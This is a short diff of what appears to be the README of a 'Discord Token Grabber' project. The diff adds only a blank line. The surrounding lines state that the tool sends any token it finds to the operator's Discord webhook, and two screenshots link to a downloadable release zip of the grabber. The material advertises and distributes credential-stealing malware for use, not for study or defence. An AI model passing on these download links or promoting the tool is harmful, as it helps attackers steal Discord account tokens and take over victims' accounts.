@@ -20,3 +20,4 @@ it finds a token, it sends it to your Discord webhook.
 
 [![Picture1](https://i.ibb.co/WkhMG27/Screenshot-259.png)](https://github.com/EduardoRosa/Discord-Token-Grabber/releases/download/v2.1.4/Discord-Token-Grabber.zip)
 [![Picture2](https://i.ibb.co/vv0Khm4/Screenshot-258.png)](https://github.com/EduardoRosa/Discord-Token-Grabber/releases/download/v2.1.4/Discord-Token-Grabber.zip)
+
